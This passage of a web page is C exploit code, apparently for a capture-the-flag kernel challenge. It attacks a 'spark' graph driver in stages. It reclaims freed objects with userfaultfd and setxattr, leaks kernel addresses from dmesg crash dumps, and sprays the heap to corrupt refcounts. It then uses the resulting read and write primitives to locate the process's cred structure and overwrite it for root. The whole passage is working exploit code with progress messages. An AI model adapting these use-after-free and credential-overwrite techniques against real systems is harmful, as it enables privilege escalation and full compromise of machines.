class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)msg.arg.pagefault.address &amp; ~<span class="hljs-number">0xfff</span>UL;<br>    uffdio_copy.len = <span class="hljs-number">0x1000</span>;<br>    uffdio_copy.mode = <span class="hljs-number">0</span>;<br>    uffdio_copy.copy = <span class="hljs-number">0</span>;<br>    assert(ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">0</span>);<br><br>    close(uffd);<br>    munmap(page, <span class="hljs-number">0x1000</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">setxattr_arg</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *buf;<br>    <span class="hljs-keyword">size_t</span> size;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> *<span class="hljs-title">setxattr_thread</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">setxattr_arg</span> *<span class="hljs-title">param</span> =</span> (struct setxattr_arg *)arg;<br>    assert(setxattr(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;nonexistent&quot;</span>, param-&gt;buf, param-&gt;size, XATTR_REPLACE) == <span class="hljs-number">-1</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">reclaim_ctx</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fault_arg</span> <span class="hljs-title">fault_arg</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">setxattr_arg</span> <span class="hljs-title">setxattr_arg</span>;</span><br>    <span class="hljs-keyword">pthread_t</span> setxattr_handle;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">reclaim_alloc_raw</span><span class="hljs-params">(struct reclaim_ctx *ctx, <span class="hljs-keyword">char</span> *buf)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> *mem = mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x2000</span>, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    assert(mem != MAP_FAILED);<br><br>    ctx-&gt;fault_arg.addr = mem + <span class="hljs-number">0x1000</span>;<br>    assert(sem_init(&amp;ctx-&gt;fault_arg.fault_sem, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) == <span class="hljs-number">0</span>);<br>    assert(sem_init(&amp;ctx-&gt;fault_arg.unblock_sem, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>) == <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">pthread_t</span> handle;<br>    assert(pthread_create(&amp;handle, <span class="hljs-literal">NULL</span>, fault_thread, &amp;ctx-&gt;fault_arg) == <span class="hljs-number">0</span>);<br>    assert(sem_wait(&amp;ctx-&gt;fault_arg.fault_sem) == <span class="hljs-number">0</span>);<br><br>    <span class="hljs-keyword">char</span> *node = mem + <span class="hljs-number">0x1000</span> - <span class="hljs-number">0x7e</span>;<br>    <span class="hljs-comment">// memcpy could cross boundaries</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x7e</span>; i++)<br>        node[i] = buf[i];<br><br>    ctx-&gt;setxattr_arg.buf = node;<br>    ctx-&gt;setxattr_arg.size = <span class="hljs-number">0x7f</span>; <span class="hljs-comment">// avoid copy_from_user 16b optimization</span><br>    assert(pthread_create(&amp;ctx-&gt;setxattr_handle, <span class="hljs-literal">NULL</span>, setxattr_thread, &amp;ctx-&gt;setxattr_arg) == <span class="hljs-number">0</span>);<br><br>    assert(sem_wait(&amp;ctx-&gt;fault_arg.fault_sem) == <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">reclaim_alloc</span><span class="hljs-params">(struct reclaim_ctx *ctx, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> is_finalized,</span></span><br><span class="hljs-params"><span class="hljs-function">                          <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> num_children, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> traversal_idx,</span></span><br><span class="hljs-params"><span class="hljs-function">                          <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> traversal)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">0x80</span>];<br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));<br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)(buf + <span class="hljs-number">0x8</span>) = <span class="hljs-number">1</span>;               <span class="hljs-comment">// refcount</span><br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)(buf + <span class="hljs-number">0x30</span>) = is_finalized;   <span class="hljs-comment">// is_finalized</span><br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *)(buf + <span class="hljs-number">0x58</span>) = num_children;  <span class="hljs-comment">// num_children</span><br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *)(buf + <span class="hljs-number">0x70</span>) = traversal_idx; <span class="hljs-comment">// traversal_idx</span><br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *)(buf + <span class="hljs-number">0x78</span>) = traversal;     <span class="hljs-comment">// traversal</span><br><br>    reclaim_alloc_raw(ctx, buf);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">reclaim_free</span><span class="hljs-params">(struct reclaim_ctx *ctx)</span></span><br><span class="hljs-function"></span>&#123;<br>    assert(sem_post(&amp;ctx-&gt;fault_arg.unblock_sem) == <span class="hljs-number">0</span>);<br>    assert(pthread_join(ctx-&gt;setxattr_handle, <span class="hljs-literal">NULL</span>) == <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">stage1_leak_dmesg</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *dist_addrp, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *edges_addrp)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i, sz;<br>    <span class="hljs-keyword">char</span> *buf;<br><br>    <span class="hljs-comment">//*query the size of the kernel ring buffer</span><br>    sz = klogctl(<span class="hljs-number">10</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>    assert(sz != <span class="hljs-number">-1</span>);<br><br>    buf = <span class="hljs-built_in">malloc</span>(sz);<br>    <span class="hljs-comment">//*read all message from the kernel buffer into @buf.</span><br>    assert(klogctl(<span class="hljs-number">3</span>, buf, sz) != <span class="hljs-number">-1</span>);<br><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> dist_addr = <span class="hljs-number">0</span>, edges_addr = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; sz &amp;&amp; (!dist_addr || !edges_addr); i++)<br>    &#123;<br>        <span class="hljs-comment">//*rax stores dis_arr</span><br>        <span class="hljs-keyword">if</span> (!dist_addr &amp;&amp; !<span class="hljs-built_in">strncmp</span>(buf + i, <span class="hljs-string">&quot;RAX: &quot;</span>, <span class="hljs-number">5</span>))<br>        &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">sscanf</span>(buf + i + <span class="hljs-number">5</span>, <span class="hljs-string">&quot;%lx&quot;</span>, &amp;dist_addr) != <span class="hljs-number">1</span>)<br>                dist_addr = <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-comment">//*r9 stores the edge</span><br>        <span class="hljs-keyword">if</span> (!edges_addr &amp;&amp; !<span class="hljs-built_in">strncmp</span>(buf + i, <span class="hljs-string">&quot;R09: &quot;</span>, <span class="hljs-number">5</span>))<br>        &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">sscanf</span>(buf + i + <span class="hljs-number">5</span>, <span class="hljs-string">&quot;%lx&quot;</span>, &amp;edges_addr) != <span class="hljs-number">1</span>)<br>                edges_addr = <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>    assert(dist_addr &amp;&amp; edges_addr);<br><br>    <span class="hljs-built_in">free</span>(buf);<br><br>    *dist_addrp = dist_addr;<br>    *edges_addrp = edges_addr;<br>&#125;<br><br><span class="hljs-comment">// resulting size should be in a rarely used cache</span><br><span class="hljs-comment">// this is supposed to be arbitrary but if you change it you&#x27;ll mess up stage 3</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> S1_DIST_NUM_NODES 12</span><br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">stage1</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *dist_addrp, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *node_addrp, <span class="hljs-keyword">int</span> *node_fdp)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S1] Creating graph\n&quot;</span>);<br>    <span class="hljs-keyword">int</span> fds[S1_DIST_NUM_NODES];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; S1_DIST_NUM_NODES; i++)<br>        fds[i] = create();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; S1_DIST_NUM_NODES; i++)<br>        llink(fds[<span class="hljs-number">0</span>], fds[i], <span class="hljs-number">1</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S1] Freeing node\n&quot;</span>);<br>    release(fds[S1_DIST_NUM_NODES - <span class="hljs-number">1</span>]);<br><br>    <span class="hljs-comment">//*the crashed process will stop execute, so create a new thread here.</span><br>    <span class="hljs-keyword">pid_t</span> pid = fork();<br>    assert(pid != <span class="hljs-number">-1</span>);<br><br>    <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>)<br>    &#123; <span class="hljs-comment">//*chlid process</span><br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S1] Reclaiming node\n&quot;</span>);<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">reclaim_ctx</span> <span class="hljs-title">ctx</span>;</span><br>        <span class="hljs-comment">//*finalized the last node, avoid the revise of the next finalize</span><br>        reclaim_alloc(&amp;ctx, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0x4141000000000000</span>UL, <span class="hljs-number">0</span>);<br><br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S1] Finalizing root\n&quot;</span>);<br>        finalize(fds[<span class="hljs-number">0</span>]);<br><br>        <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S1] Performing crash query by UAF\n&quot;</span>);<br>        query(fds[<span class="hljs-number">0</span>], fds[<span class="hljs-number">1</span>]);<br><br>        <span class="hljs-comment">// Will never get here</span><br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br><br>    usleep(<span class="hljs-number">250</span> * <span class="hljs-number">1000</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S1] Leaking from dmesg\n&quot;</span>);<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> dist_addr, edges_addr;<br>    stage1_leak_dmesg(&amp;dist_addr, &amp;edges_addr);<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> node_addr = edges_addr - <span class="hljs-number">0x60</span>;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S1] Dist @ 0x%lx\n&quot;</span>, dist_addr);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S1] Node @ 0x%lx\n&quot;</span>, node_addr);<br><br>    *dist_addrp = dist_addr;<br>    *node_addrp = node_addr;<br>    *node_fdp = fds[<span class="hljs-number">0</span>];<br><span class="hljs-meta">#<span class="hljs-meta-keyword">undef</span> STAGE1_NUM_NODES</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">stage2_spray</span><span class="hljs-params">(<span class="hljs-keyword">int</span> *fd, <span class="hljs-keyword">int</span> before, <span class="hljs-keyword">int</span> n, <span class="hljs-keyword">int</span> skip, <span class="hljs-keyword">int</span> after)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; before; i++)<br>        create();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>        fd[i] = create();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i += skip)<br>    &#123;<br>        release(fd[i]);<br>        fd[i] = <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; after; i++)<br>        create();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">stage2</span><span class="hljs-params">(struct reclaim_ctx *victim_ctx, <span class="hljs-keyword">int</span> *victim_fdp)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-comment">//*errrrrrr, dist array size will be 8b less than STAGE2_NUM_NODES*8</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STAGE2_NUM_NODES 17 <span class="hljs-comment">// dist array size == 0x80 == sizeof node</span></span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S2] Creating graph\n&quot;</span>);<br>    <span class="hljs-keyword">int</span> fds[STAGE2_NUM_NODES];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; STAGE2_NUM_NODES; i++)<br>        fds[i] = create();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; STAGE2_NUM_NODES; i++)<br>        llink(fds[<span class="hljs-number">0</span>], fds[i], <span class="hljs-number">1</span>); <span class="hljs-comment">// 1 will be written at traversal_idx</span><br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S2] Freeing node\n&quot;</span>);<br>    release(fds[STAGE2_NUM_NODES - <span class="hljs-number">1</span>]);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S2] Reclaiming node\n&quot;</span>);<br>    <span class="hljs-comment">//*the idx is 17</span><br>    reclaim_alloc(victim_ctx, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, (<span class="hljs-number">0x80</span> + <span class="hljs-number">0x8</span>) / <span class="hljs-number">8</span>, <span class="hljs-number">0</span>); <span class="hljs-comment">// target: sprayed refcount</span><br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S2] Finalizing root\n&quot;</span>);<br>    <span class="hljs-comment">//*now fds[0] have children in different traversals. the last and the others.</span><br>    finalize(fds[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S2] Creating predecessor\n&quot;</span>);<br>    <span class="hljs-keyword">int</span> spray_incref_fd = create();<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STAGE2_SPRAY_NUM 200</span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S2] Spraying nodes\n&quot;</span>);<br>    <span class="hljs-keyword">int</span> spray_fd[STAGE2_SPRAY_NUM];<br>    stage2_spray(spray_fd, <span class="hljs-number">30</span>, STAGE2_SPRAY_NUM, <span class="hljs-number">4</span>, <span class="hljs-number">30</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S2] Incrementing sprayed refcounts\n&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; STAGE2_SPRAY_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (spray_fd[i] != <span class="hljs-number">-1</span>)<br>            llink(spray_incref_fd, spray_fd[i], <span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-comment">//*above ops create gaps in size of struct_node for dis_arr</span><br>    <span class="hljs-comment">//*next line there is nothing special</span><br>    finalize(spray_incref_fd);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S2] Corrupting refcount\n&quot;</span>);<br>    <span class="hljs-comment">//*use the OOB to corrupt the dis_arr&#x27;s adjacent node struct.</span><br>    query(fds[<span class="hljs-number">0</span>], fds[<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S2] Freeing victim node\n&quot;</span>);<br>    <span class="hljs-comment">//*release the root, but only the node whose refcount has been modified will be freed</span><br>    <span class="hljs-comment">//*and all fds except for root retain the same as before.</span><br>    release(spray_incref_fd);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S2] Reclaiming victim node\n&quot;</span>);<br>    reclaim_free(victim_ctx); <span class="hljs-comment">// unblock fault</span><br>                              <span class="hljs-comment">// ephemeral alloc to put two 0xff at the end for traversal top bytes</span><br>                              <span class="hljs-comment">//*these two bytes are in next uffd page</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> buf[<span class="hljs-number">0x80</span>];<br>    buf[<span class="hljs-keyword">sizeof</span>(buf) - <span class="hljs-number">1</span>] = <span class="hljs-number">0xff</span>;<br>    buf[<span class="hljs-keyword">sizeof</span>(buf) - <span class="hljs-number">2</span>] = <span class="hljs-number">0xff</span>;<br>    <span class="hljs-comment">//*now there are serveral gaps in size of node_t, which one will be chosed?</span><br>    <span class="hljs-comment">//*good luck. at least the following two lines will use the same chunk.</span><br>    assert(setxattr(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-string">&quot;nonexistent&quot;</span>, buf, <span class="hljs-keyword">sizeof</span>(buf), XATTR_REPLACE) == <span class="hljs-number">-1</span>);<br>    reclaim_alloc(victim_ctx, <span class="hljs-number">0</span>, <span class="hljs-number">1337</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S2] Searching for victim node(fd)\n&quot;</span>);<br>    <span class="hljs-keyword">int</span> victim_fd = <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; STAGE2_SPRAY_NUM; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (spray_fd[i] != <span class="hljs-number">-1</span>)<br>        &#123;<br>            <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spark_info</span> <span class="hljs-title">info</span> =</span> &#123;<br>                .num_children = <span class="hljs-number">0</span>,<br>            &#125;;<br>            get_info(spray_fd[i], &amp;info);<br>            <span class="hljs-keyword">if</span> (info.num_children == <span class="hljs-number">1337</span>)<br>            &#123;<br>                victim_fd = spray_fd[i];<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//*indeed, this totally depends on luck...</span><br>    assert(victim_fd != <span class="hljs-number">-1</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S2] Victim fd = %d\n&quot;</span>, victim_fd);<br>    *victim_fdp = victim_fd;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">undef</span> STAGE2_SPRAY_NUM</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">undef</span> STAGE2_NUM_NODES</span><br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> STAGE3_READ_NUM_CHILDREN 0x4142133703030303</span><br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-title">stage3_read</span><span class="hljs-params">(struct reclaim_ctx *ctx, <span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> addr)</span></span><br><span class="hljs-function"></span>&#123;<br>    reclaim_free(ctx);<br>    <span class="hljs-comment">// during read, we keep a special num_children so we can find ourselves</span><br>    reclaim_alloc(ctx, <span class="hljs-number">1</span>, STAGE3_READ_NUM_CHILDREN, <span class="hljs-number">0</span>, addr);<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spark_info</span> <span class="hljs-title">info</span>;</span><br>    get_info(fd, &amp;info);<br>    <span class="hljs-keyword">return</span> info.traversal_size;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">stage3</span><span class="hljs-params">(struct reclaim_ctx *ctx, <span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">int</span> *scratch_fds, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> s1_dist_addr,</span></span><br><span class="hljs-params"><span class="hljs-function">                   <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> s1_node_addr)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">0x80</span>];<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S3] Finding victim node\n&quot;</span>);<br>    <span class="hljs-comment">//*.......nb</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> victim_addr = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">6000</span>; i &lt; <span class="hljs-number">10000</span>; i++)<br>    &#123;<br>        <span class="hljs-comment">//*why the node is sizeof(node_t) aligned???</span><br>        <span class="hljs-comment">//*is there something strange in kernel slab memory manager?</span><br>        <span class="hljs-comment">//*7000~7800</span><br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> addr = s1_node_addr + i * <span class="hljs-number">0x80</span>;<br>        <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> value = stage3_read(ctx, fd, addr + <span class="hljs-number">0x58</span>);<br>        <span class="hljs-keyword">if</span> (value == STAGE3_READ_NUM_CHILDREN)<br>        &#123;<br>            victim_addr = addr;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    assert(victim_addr);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S3] Victim @ 0x%lx\n&quot;</span>, victim_addr);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S3] Findings creds\n&quot;</span>);<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> current = stage3_read(ctx, fd, victim_addr + <span class="hljs-number">0x10</span>); <span class="hljs-comment">// state_lock.owner</span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S3] current = 0x%lx\n&quot;</span>, current);<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> cred_addr = stage3_read(ctx, fd, current + <span class="hljs-number">0xa90</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S3] cred @ 0x%lx\n&quot;</span>, cred_addr);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S3] Crafting linkable node\n&quot;</span>);<br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));<br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *)(buf + <span class="hljs-number">0x0</span>) = <span class="hljs-number">100000</span>;              <span class="hljs-comment">// id</span><br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)(buf + <span class="hljs-number">0x8</span>) = <span class="hljs-number">1</span>;                    <span class="hljs-comment">// refcount</span><br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)(buf + <span class="hljs-number">0x30</span>) = <span class="hljs-number">0</span>;                   <span class="hljs-comment">// is_finalized</span><br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *)(buf + <span class="hljs-number">0x60</span>) = victim_addr + <span class="hljs-number">0x60</span>; <span class="hljs-comment">// edges.next (empty list)</span><br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *)(buf + <span class="hljs-number">0x68</span>) = victim_addr + <span class="hljs-number">0x68</span>; <span class="hljs-comment">// edges.prev (empty list)</span><br>    reclaim_free(ctx);<br>    reclaim_alloc_raw(ctx, buf);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S3] Building graph\n&quot;</span>);<br>    <span class="hljs-keyword">int</span> graph_fds[S1_DIST_NUM_NODES];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; S1_DIST_NUM_NODES - <span class="hljs-number">1</span>; i++)<br>        graph_fds[i] = scratch_fds[i]; <span class="hljs-comment">// avoid allocations, they mess stuff up</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">1</span>; i &lt; S1_DIST_NUM_NODES - <span class="hljs-number">1</span>; i++)<br>        llink(graph_fds[<span class="hljs-number">0</span>], graph_fds[i], <span class="hljs-number">0</span>);<br>    llink(graph_fds[<span class="hljs-number">0</span>], fd, <span class="hljs-number">0</span>); <span class="hljs-comment">// weight = write primitive value (zero for root creds)</span><br>    finalize(graph_fds[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;[S3] Freeing stage1 dist array\n&quot;</span>);<br>    <span class="hljs-comment">//*due to stage 1 child process crashed, we have no choice but this method.</span><br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));<br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)(buf + <span class="hljs-number">0x8</span>) = <span class="hljs-number">1</span>;                     <span class="hljs-comment">// refcount</span><br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)(buf + <span class="hljs-number">0x30</span>) = <span class="hljs-number">1</span>;                    <span class="hljs-comment">// is_finalized</span><br>                                                          <span class="hljs-comment">// fake node_array overlaps unused nb_lock</span><br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *)(buf + <span class="hljs-number">0x38</span> + <span class="hljs-number">0x0</span>) = <span class="hljs-number">0</span>;             <span class="hljs-comment">// fake node_array.size</span><br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *)(buf + <span class="hljs-number">0x38</span> + <span class="hljs-number">0x10</span>) = s1_dist_addr; <span class="hljs-comment">// fake node_array.nodes (will be freed)</span><br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *)(buf + <span class="hljs-number">0x60</span>) = victim_addr + <span class="hljs-number">0x60</span>;  <span class="hljs-comment">// edges.next (empty list)</span><br>    *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> *)(buf + <span class="hljs-number">0x78</span>) = victim_addr + <span class="hljs-number">0x38</span>;  <span class="hljs-comment">// traversal = fake node_array</span><br>    reclaim_free(ctx);<br>    reclaim_alloc_raw(ctx, buf);<br>    release(fd);   <span class="hljs-comment">// free s1_dist_addr</span><br>    fd = create(); <span class="hljs-comment">// immediately reclaim victim node to restore stable state</span><br><br>    <span 